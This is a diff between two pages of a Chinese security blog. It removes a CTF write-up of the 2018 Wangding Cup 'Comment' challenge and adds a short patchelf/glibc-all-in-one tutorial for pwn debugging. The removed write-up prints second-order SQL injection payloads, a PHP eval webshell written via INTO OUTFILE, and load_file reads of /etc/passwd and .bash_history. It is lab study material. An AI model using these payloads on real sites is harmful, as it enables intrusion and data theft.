@@ -15,32 +15,20 @@
 
 
 
-<meta name="description" content="在家无聊在buu刷到2018网鼎杯的Comment，发现有好几个点正好是的我目前比较薄弱的故写文以记之.">
+<meta name="description" content="最近在学习堆时,常常遇到本地libc与题目libc不匹配导致一些骚套路无法在本地调试和利用.要想gdb,不仅得要安个符合版本的虚拟机或起一个docker还有部署一边pwn环境,这一点很烦(#&#96;Д´).于是想找下有没有更方便的方法.  于是找到了patchelf更换libc的方法。">
 <meta property="og:type" content="article">
-<meta property="og:title" content="网鼎杯 2018-Comment  复现笔记">
-<meta property="og:url" content="lexsd6.github.io/2021/02/15/%E7%BD%91%E9%BC%8E%E6%9D%AF%202018-Comment%20%20%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/index.html">
+<meta property="og:title" content="修改ELF文件libc为指定版本">
+<meta property="og:url" content="lexsd6.github.io/2021/03/25/%E4%BF%AE%E6%94%B9ELF%E6%96%87%E4%BB%B6libc%E4%B8%BA%E6%8C%87%E5%AE%9A%E7%89%88%E6%9C%AC/index.html">
 <meta property="og:site_name" content="lexsd6&#39;s home">
-<meta property="og:description" content="在家无聊在buu刷到2018网鼎杯的Comment，发现有好几个点正好是的我目前比较薄弱的故写文以记之.">
+<meta property="og:description" content="最近在学习堆时,常常遇到本地libc与题目libc不匹配导致一些骚套路无法在本地调试和利用.要想gdb,不仅得要安个符合版本的虚拟机或起一个docker还有部署一边pwn环境,这一点很烦(#&#96;Д´).于是想找下有没有更方便的方法.  于是找到了patchelf更换libc的方法。">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="lexsd6.github.io/2021/02/15/%E7%BD%91%E9%BC%8E%E6%9D%AF%202018-Comment%20%20%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/image-20210215220051579.png">
-<meta property="og:image" content="lexsd6.github.io/2021/02/15/%E7%BD%91%E9%BC%8E%E6%9D%AF%202018-Comment%20%20%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/image-20210215222444037.png">
-<meta property="og:image" content="lexsd6.github.io/2021/02/15/%E7%BD%91%E9%BC%8E%E6%9D%AF%202018-Comment%20%20%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/image-20210215222731749.png">
-<meta property="og:image" content="lexsd6.github.io/2021/02/15/%E7%BD%91%E9%BC%8E%E6%9D%AF%202018-Comment%20%20%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/image-20210215233502014.png">
-<meta property="og:image" content="lexsd6.github.io/2021/02/15/%E7%BD%91%E9%BC%8E%E6%9D%AF%202018-Comment%20%20%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/image-20210216000155737.png">
-<meta property="og:image" content="lexsd6.github.io/2021/02/15/%E7%BD%91%E9%BC%8E%E6%9D%AF%202018-Comment%20%20%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/image-20210216000223139.png">
-<meta property="og:image" content="lexsd6.github.io/2021/02/15/%E7%BD%91%E9%BC%8E%E6%9D%AF%202018-Comment%20%20%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/image-20210216000257110.png">
-<meta property="og:image" content="lexsd6.github.io/2021/02/15/%E7%BD%91%E9%BC%8E%E6%9D%AF%202018-Comment%20%20%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/image-20210215231823859.png">
-<meta property="og:image" content="lexsd6.github.io/2021/02/15/%E7%BD%91%E9%BC%8E%E6%9D%AF%202018-Comment%20%20%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/image-20210216110435524.png">
-<meta property="og:image" content="lexsd6.github.io/2021/02/15/%E7%BD%91%E9%BC%8E%E6%9D%AF%202018-Comment%20%20%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/image-20210216000357240.png">
-<meta property="article:published_time" content="2021-02-15T10:10:28.605Z">
-<meta property="article:modified_time" content="2021-02-16T03:54:51.771Z">
+<meta property="article:published_time" content="2021-03-25T14:49:04.809Z">
+<meta property="article:modified_time" content="2021-03-26T05:55:10.946Z">
 <meta property="article:author" content="lexsd6">
-<meta property="article:tag" content="wp">
-<meta property="article:tag" content="web">
-<meta property="article:tag" content="sql">
+<meta property="article:tag" content="pwn">
 <meta property="article:tag" content="Linux">
+<meta property="article:tag" content="libc">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="lexsd6.github.io/2021/02/15/%E7%BD%91%E9%BC%8E%E6%9D%AF%202018-Comment%20%20%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/image-20210215220051579.png">
 
 <link rel="apple-touch-icon" href= "/apple-touch-icon.png">
 
@@ -74,7 +62,7 @@
 <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
 
 
-<title>网鼎杯 2018-Comment  复现笔记 | lexsd6&#39;s home</title>
+<title>修改ELF文件libc为指定版本 | lexsd6&#39;s home</title>
 
 <script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
 <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
@@ -281,11 +269,11 @@
     </div>
     <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
 </nav>
-      <div class="body-wrap"><article id="post-网鼎杯 2018-Comment  复现笔记" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-修改ELF文件libc为指定版本" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2021/02/15/%E7%BD%91%E9%BC%8E%E6%9D%AF%202018-Comment%20%20%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/" class="article-date">
-      <time datetime="2021-02-15T10:10:28.605Z" itemprop="datePublished">2021-02-15</time>
+      <a href="/2021/03/25/%E4%BF%AE%E6%94%B9ELF%E6%96%87%E4%BB%B6libc%E4%B8%BA%E6%8C%87%E5%AE%9A%E7%89%88%E6%9C%AC/" class="article-date">
+      <time datetime="2021-03-25T14:49:04.809Z" itemprop="datePublished">2021-03-25</time>
 </a>
 
 
@@ -300,7 +288,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      网鼎杯 2018-Comment  复现笔记
+      修改ELF文件libc为指定版本
     </h1>
   
 
@@ -310,7 +298,7 @@
       <span class="post-meta-item-icon">
         <i class="fa fa-keyboard-o"></i>
         <span class="post-meta-item-text">  字数统计: </span>
-        <span class="post-count">1k字</span>
+        <span class="post-count">402字</span>
       </span>
     </span>
 
@@ -319,7 +307,7 @@
       <span class="post-meta-item-icon">
         <i class="fa fa-hourglass-half"></i>
         <span class="post-meta-item-text">  阅读时长: </span>
-        <span class="post-count">4分</span>
+        <span class="post-count">1分</span>
       </span>
     </span>
 </div>
@@ -330,13 +318,13 @@
       <div class="article-info article-info-post">
         
     <div class="article-category tagcloud">
-    <a class="article-category-link" href="/categories/CTF/">CTF</a>
+    <a class="article-category-link" href="/categories/Linux/">Linux</a>
     </div>
 
 
         
     <div class="article-tag tagcloud" >
-        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Linux/" rel="tag">Linux</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sql/" rel="tag">sql</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Linux/" rel="tag">Linux</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/libc/" rel="tag">libc</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li></ul>
 
     </div>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        
@@ -347,67 +335,25 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <p>在家无聊在buu刷到2018网鼎杯的Comment，发现有好几个点正好是的我目前比较薄弱的故写文以记之.<a id="more"></a></p>
-<h2 id="0x01过程步骤"><a href="#0x01过程步骤" class="headerlink" title="0x01过程步骤"></a>0x01过程步骤</h2><p>、进入题目，发现是一个帖子论坛网站。发现有疑似sql注入的注入点。但是测试后没有发现明显的利用点，就没有什么思绪。尝试访问几个常见文件或目录名，发现有git泄露。</p>
-<p><img src="image-20210215220051579.png" alt="image-20210215220051579"></p>
-<p>用githack获得源文件。</p>
-<p><img src="image-20210215222444037.png" alt="image-20210215222444037"></p>
-<p>经过审计发现有疑似，二次注入的可能。</p>
-<p><img src="image-20210215222731749.png" alt="image-20210215222731749"></p>
-<p>由于addslashes会将一些符号转义但是在sql转义的符号在储存后与addslashes前并没有什么改变（换句话说<code>\&#39;</code>在存入sql后，读取出来仍会是<code>&#39;</code>）。所有我们可以写入数据，再通过这一特性将<code>&#39;</code>逃逸出来，即二次注入。</p>
-<p>因此我们可以构造paylaod：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a&#39;,(select database()),x&#x3D;1&#x2F;*</span><br><span class="line"></span><br><span class="line">*&#x2F;</span><br></pre></td></tr></table></figure>
+        <p>最近在学习堆时,常常遇到本地libc与题目libc不匹配导致一些骚套路无法在本地调试和利用.要想gdb,不仅得要安个符合版本的虚拟机或起一个docker还有部署一边pwn环境,这一点很烦(#`Д´).于是想找下有没有更方便的方法.  于是找到了patchelf更换libc的方法。</p>
+<a id="more"></a>
 
-<p>但是这题有个坑的地方，审计源码+测试发现只有 content 字段我们才能利用。</p>
-<p>所有完整payload：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">第一包（write.php）</span><br><span class="line">title&#x3D;2&amp;category&#x3D;a&#39;,content&#x3D;(select database()),&#x2F;*&amp;content&#x3D;111</span><br><span class="line">第二包（comment.php）</span><br><span class="line">content&#x3D;*&#x2F;#</span><br></pre></td></tr></table></figure>
+<h3 id="glibc-all-in-one与patchelf安装"><a href="#glibc-all-in-one与patchelf安装" class="headerlink" title="glibc-all-in-one与patchelf安装"></a>glibc-all-in-one与patchelf安装</h3><p>glibc-all-in-one，正如其名是一个多版本libc的下载安装管理工具，主要支持2.19，2.23-2.29版本的libc和i686, amd64的架构。这是github一个开源项目因此我们git它既可。</p>
+<p>安装命令：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/matrix1001/glibc-all-in-one.git </span><br><span class="line">cd glibc-all-in-one </span><br><span class="line">chmod a+x build download extract</span><br></pre></td></tr></table></figure>
 
-<p>这样导致：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">comment</span></span><br><span class="line">            <span class="keyword">set</span> <span class="keyword">category</span> = <span class="string">'$category'</span>,</span><br><span class="line">                <span class="keyword">content</span> = <span class="string">'$content'</span>,</span><br><span class="line">                bo_id = <span class="string">'$bo_id'</span><span class="string">"</span></span><br></pre></td></tr></table></figure>
+<p>patchelf在ubuntu直接<code>apt install patchelf</code>即可。</p>
+<h3 id="对应libc编译"><a href="#对应libc编译" class="headerlink" title="对应libc编译"></a>对应libc编译</h3><p>我们可以通过在glibc-all-in-one目录下执行<code>./build</code>即可获对应版本的libc和ld.so</p>
+<p>例如：<code>./build 2.29 i686</code></p>
+<p>下载安装编译 32位的2.29 版本libc。</p>
+<h3 id="patchelf更改程序libc"><a href="#patchelf更改程序libc" class="headerlink" title="patchelf更改程序libc"></a>patchelf更改程序libc</h3><p>执行<code>patchelf --set-interpreter ld.so  elf</code>    来修改文件ld.so</p>
+<p>执行<code>patchelf --replace-needed   old_libc.so  new_libc.so elf</code>来修改文件libc.so</p>
+<p>以更改gundam文件为例,例如：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo patchelf --set-interpreter /glibc/2.26/amd64/lib/ld-2.26.so --set-rpath /glibc/2.26/amd64/lib/ ~/Desktop/pwn/buu/gumad/gundam</span><br><span class="line"></span><br><span class="line">patchelf --replace-needed /glibc/2.23/amd64/lib/libc-2.23.so /glibc/2.26/amd64/lib/libc-2.26.so ~/Desktop/pwn/buu/gumad/gundam</span><br></pre></td></tr></table></figure>
 
-<p>当$category为<code>a&#39;,content=(select database()),/*</code></p>
-<p>$content为<code>*/#</code>时</p>
-<p>sql语句就变成</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">comment</span></span><br><span class="line">            <span class="keyword">set</span> <span class="keyword">category</span> = <span class="string">'`a'</span>,<span class="keyword">content</span>=(<span class="keyword">select</span> <span class="keyword">database</span>()),<span class="comment">/*`',</span></span><br><span class="line"><span class="comment">                content = '*/</span><span class="string">',</span></span><br><span class="line"><span class="string">                bo_id = '</span>$bo_id<span class="string">'"</span></span><br></pre></td></tr></table></figure>
-
-<p>从而产生注入。</p>
-<p><img src="image-20210215233502014.png" alt="image-20210215233502014"></p>
-<p>但通过注入数据库并未得到什么有效信息。所以猜测是否是写入shell或读取文件。</p>
-<p>本想通过<code>select &quot;&lt;?php eval($_POST[1]);?&gt;&quot; into outfile &quot;/var/www/html/a.php&quot;</code>写入shell但未能成功。于是同过load_file函数来读取文件。</p>
-<p>然后又一个问题来了读取什么文件?</p>
-<p>我们尝试读取<code>flag.php</code>、<code>flag.txt</code>、<code>/flag</code>但是发现并未有flag标识。</p>
-<p>思路一下就短路了，在查阅了资料后了解到<code>.bash_history</code>存放了当前用户历史执行命令。但这个文件在当前用户的目录下。因此我们先要读取<code>/etc/pass</code>获取当前用户信息。</p>
-<p><img src="image-20210216000155737.png" alt="image-20210216000155737"></p>
-<p><img src="image-20210216000223139.png" alt="image-20210216000223139"></p>
-<p>然后这里有个小知识点一般下www用户是在web服务部署时专门设置来管理web的用户。</p>
-<p>读取www用户下的<code>.bash_history</code>即访问路径<code>/home/www/.bash_history</code>。</p>
-<p><img src="image-20210216000257110.png" alt="image-20210216000257110"></p>
-<p>看到linux执行过的命令：</p>
-<p>1。跳转到tmp目录</p>
-<p>2。用unzip解压 html.zip ，这时会产生一个html的文件夹</p>
-<p>3。rm 删除了html.zip </p>
-<p>4。cp 将html 文件夹拷贝在 /var/www 目录下</p>
-<p>5。跳转到 /var/html 目录下</p>
-<p>6。删除了<code>.DS_Store</code>文件</p>
-<p>7。启动 web服务</p>
-<p>发现在<code>/var/www/html</code>下的<code>.DS_Store</code>被删除，但是<code>/tmp</code>下的<code>.DS_Store</code>未被删除。读取发现是2进制文件且带有很多<code>\00</code>字符因此用hex转16进制读取。</p>
-<p><img src="image-20210215231823859.png" alt="image-20210215231823859"></p>
-<p>再用winhex读取</p>
-<p><img src="image-20210216110435524.png" alt="image-20210216110435524"></p>
-<p>发现flag_8946e1ff1ee3e40f.php文件。</p>
-<p>在/tmp/html下读取发现是假flag。</p>
-<p>在/var/www/html/下读取到真正flag</p>
-<p><img src="image-20210216000357240.png" alt="image-20210216000357240"></p>
-<h2 id="0x02考点总结"><a href="#0x02考点总结" class="headerlink" title="0x02考点总结"></a>0x02考点总结</h2><h3 id="1-文件泄露"><a href="#1-文件泄露" class="headerlink" title="1.文件泄露"></a>1.文件泄露</h3><p>在本题中考察的是<code>.git</code>文件泄露，我们可以利用githack脚本来恢复历史版本和下载git文件。</p>
-<p>ps：git log -all 恢复历史文件。</p>
-<h3 id="2-sql二次注入"><a href="#2-sql二次注入" class="headerlink" title="2.sql二次注入"></a>2.sql二次注入</h3><p>在本题中，服务器端只对用传来的数据进行了过滤。sql内部的数据为进行过滤。加之<code>\&#39;</code>在存入sql后，读取出来仍会是<code>&#39;</code>。这样<code>‘</code>就逃逸出来。</p>
-<h3 id="3-sql文件读取"><a href="#3-sql文件读取" class="headerlink" title="3.sql文件读取"></a>3.sql文件读取</h3><p>我们可以同过user()来查看当前用户名，若有读权限那么可以通过load_file函数来读取文件。</p>
-<p>同时lunix 下又很多敏感文件，比如：<code>.bash_history</code>存放了历史执行命令、/etc/passwd存放了用户信息、/etc/shadow存放用户密码且一般情况下不可读的。</p>
-<h3 id="4-linux-命令细节"><a href="#4-linux-命令细节" class="headerlink" title="4.linux 命令细节"></a>4.linux 命令细节</h3><p>在本题中考了写linux命令的细节，如cp会保留原文件，unzip 解压时默认在当前路径下生成解压出来的文件。</p>
-<h3 id="5-hexwin-分析hex数据"><a href="#5-hexwin-分析hex数据" class="headerlink" title="5.hexwin 分析hex数据"></a>5.hexwin 分析hex数据</h3><p>我们可以将数据转为16进制再通过hexwin写入文件还原从而获得一些内容特别的文件或数据。</p>
-<h2 id="0x00参考文献"><a href="#0x00参考文献" class="headerlink" title="0x00参考文献"></a>0x00参考文献</h2><p><a href="https://www.jb51.net/article/108979.htm" target="_blank" rel="noopener">https://www.jb51.net/article/108979.htm</a></p>
-<p><a href="https://www.freebuf.com/articles/web/167089.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/167089.html</a></p>
-<p><a href="https://blog.csdn.net/qq_41628669/article/details/106133104" target="_blank" rel="noopener">https://blog.csdn.net/qq_41628669/article/details/106133104</a></p>
+<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a href="https://www.nopnoping.xyz/2020/04/17/%E4%BF%AE%E6%94%B9%E7%A8%8B%E5%BA%8F%E4%B8%BA%E6%8C%87%E5%AE%9Alibc%E7%89%88%E6%9C%AC-pwndbg%E5%AE%89%E8%A3%85/" target="_blank" rel="noopener">https://www.nopnoping.xyz/2020/04/17/%E4%BF%AE%E6%94%B9%E7%A8%8B%E5%BA%8F%E4%B8%BA%E6%8C%87%E5%AE%9Alibc%E7%89%88%E6%9C%AC-pwndbg%E5%AE%89%E8%A3%85/</a></p>
+<p><a href="https://blog.csdn.net/github_36788573/article/details/103291343" target="_blank" rel="noopener">https://blog.csdn.net/github_36788573/article/details/103291343</a></p>
+<p><a href="https://blog.csdn.net/qq_41560595/article/details/114597342" target="_blank" rel="noopener">https://blog.csdn.net/qq_41560595/article/details/114597342</a></p>
 
       
     </div>
@@ -416,13 +362,13 @@
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2021/02/15/%E7%BD%91%E9%BC%8E%E6%9D%AF%202018-Comment%20%20%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/">网鼎杯 2018-Comment  复现笔记</a></p>
+        <p><span>本文标题:</span><a href="/2021/03/25/%E4%BF%AE%E6%94%B9ELF%E6%96%87%E4%BB%B6libc%E4%B8%BA%E6%8C%87%E5%AE%9A%E7%89%88%E6%9C%AC/">修改ELF文件libc为指定版本</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页">lexsd6</a></p>
-        <p><span>发布时间:</span>2021-02-15, 18:10:28</p>
-        <p><span>最后更新:</span>2021-02-16, 11:54:51</p>
+        <p><span>发布时间:</span>2021-03-25, 22:49:04</p>
+        <p><span>最后更新:</span>2021-03-26, 13:55:10</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2021/02/15/%E7%BD%91%E9%BC%8E%E6%9D%AF%202018-Comment%20%20%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/" title="网鼎杯 2018-Comment  复现笔记">lexsd6.github.io/2021/02/15/%E7%BD%91%E9%BC%8E%E6%9D%AF%202018-Comment%20%20%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/</a>
-            <span class="copy-path" data-clipboard-text="原文: lexsd6.github.io/2021/02/15/%E7%BD%91%E9%BC%8E%E6%9D%AF%202018-Comment%20%20%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/　　作者: lexsd6" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <span>原始链接:</span><a class="post-url" href="/2021/03/25/%E4%BF%AE%E6%94%B9ELF%E6%96%87%E4%BB%B6libc%E4%B8%BA%E6%8C%87%E5%AE%9A%E7%89%88%E6%9C%AC/" title="修改ELF文件libc为指定版本">lexsd6.github.io/2021/03/25/%E4%BF%AE%E6%94%B9ELF%E6%96%87%E4%BB%B6libc%E4%B8%BA%E6%8C%87%E5%AE%9A%E7%89%88%E6%9C%AC/</a>
+            <span class="copy-path" data-clipboard-text="原文: lexsd6.github.io/2021/03/25/%E4%BF%AE%E6%94%B9ELF%E6%96%87%E4%BB%B6libc%E4%B8%BA%E6%8C%87%E5%AE%9A%E7%89%88%E6%9C%AC/　　作者: lexsd6" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
         <p>
@@ -434,16 +380,10 @@
 
     <nav id="article-nav">
         
-            <div id="article-nav-newer" class="article-nav-title">
-                <a href="/2021/03/11/fastbin%E4%BA%8C%E6%AC%A1%E9%87%8A%E6%94%BE%E2%80%94%E2%80%94%E5%AD%A6pwn%E5%B0%8F%E8%AE%B0(5)/">
-                    fastbin二次释放——学pwn小记(5)
-                </a>
-            </div>
-        
         
             <div id="article-nav-older" class="article-nav-title">
-                <a href="/2021/01/31/%E5%85%B3%E4%BA%8Esql%E6%B3%A8%E5%85%A5bypass%E6%80%BB%E7%BB%93/">
-                    关于sql注入bypass总结
+                <a href="/2021/03/14/%E5%8A%AB%E6%8C%81hook%E5%87%BD%E6%95%B0%E2%80%94%E2%80%94%E5%AD%A6pwn%E5%B0%8F%E8%AE%B0(6)/">
+                    劫持hook函数——学pwn小记(6)
                 </a>
             </div>
         
@@ -455,7 +395,7 @@
     <div id="toc" class="toc-article">
         <strong class="toc-title">文章目录</strong>
         
-            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01过程步骤"><span class="toc-text">0x01过程步骤</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02考点总结"><span class="toc-text">0x02考点总结</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-文件泄露"><span class="toc-text">1.文件泄露</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-sql二次注入"><span class="toc-text">2.sql二次注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-sql文件读取"><span class="toc-text">3.sql文件读取</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-linux-命令细节"><span class="toc-text">4.linux 命令细节</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-hexwin-分析hex数据"><span class="toc-text">5.hexwin 分析hex数据</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00参考文献"><span class="toc-text">0x00参考文献</span></a></li></ol>
+            <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#glibc-all-in-one与patchelf安装"><span class="toc-text">glibc-all-in-one与patchelf安装</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#对应libc编译"><span class="toc-text">对应libc编译</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#patchelf更改程序libc"><span class="toc-text">patchelf更改程序libc</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考文献"><span class="toc-text">参考文献</span></a>
         
     </div>
     <style>
@@ -491,7 +431,7 @@
         </div>
         <script>
             window._bd_share_config={
-                "common":{"bdSnsKey":{},"bdText":"网鼎杯 2018-Comment  复现笔记　| lexsd6's home　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+                "common":{"bdSnsKey":{},"bdText":"修改ELF文件libc为指定版本　| lexsd6's home　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
         </script>
     
 
@@ -511,15 +451,13 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2021/03/11/fastbin%E4%BA%8C%E6%AC%A1%E9%87%8A%E6%94%BE%E2%80%94%E2%80%94%E5%AD%A6pwn%E5%B0%8F%E8%AE%B0(5)/" title="上一篇: fastbin二次释放——学pwn小记(5)">
-                <i class="fa fa-angle-left"></i>
-            </a>
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
         
 
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
 
         
-            <a href="/2021/01/31/%E5%85%B3%E4%BA%8Esql%E6%B3%A8%E5%85%A5bypass%E6%80%BB%E7%BB%93/" title="下一篇: 关于sql注入bypass总结">
+            <a href="/2021/03/14/%E5%8A%AB%E6%8C%81hook%E5%87%BD%E6%95%B0%E2%80%94%E2%80%94%E5%AD%A6pwn%E5%B0%8F%E8%AE%B0(6)/" title="下一篇: 劫持hook函数——学pwn小记(6)">
                 <i class="fa fa-angle-right"></i>
             </a>
         
